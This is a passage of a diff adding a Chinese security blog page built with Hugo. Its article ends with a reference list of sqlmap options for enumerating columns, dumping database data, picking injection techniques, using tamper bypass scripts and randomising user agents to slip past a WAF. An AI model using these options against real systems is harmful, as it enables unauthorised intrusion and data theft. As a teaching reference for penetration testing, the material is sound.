+</span></span><span class="line"><span class="cl">--columns  指定爆列（需要指定表和数据库）
+</span></span><span class="line"><span class="cl">-C  指定列   -C secret
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--dump   指定爆数据（需要指定表、列、数据库）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--tamper  &#39;绕过脚本.py&#39;  指定爆破脚本
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--technique   指定sql注入的方式   =B（布尔盲注） =U（联合注入） =E（报错注入） =S（堆叠注入）=T（时间盲注） =Q（内联查询注入）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">–random-agent为了随机UA头，避免被WAF认为是爬虫
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">–fresh-queries：禁用 SQLMap 的缓存机制，每次请求都重新生成新的查询，避免因缓存导致结果不准确。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">–no-cast：禁用 SQLMap 对返回数据的类型转换，直接返回原始数据。适用于某些特殊场景（如数据库对类型处理不一致）。
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/awdawdp%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWD|AWDP从零到一</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%87%AA%E4%B8%BB%E7%A0%94%E7%A9%B6%E6%96%B0%E5%8F%91%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">自主研究新发现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nodejs/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NodeJS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
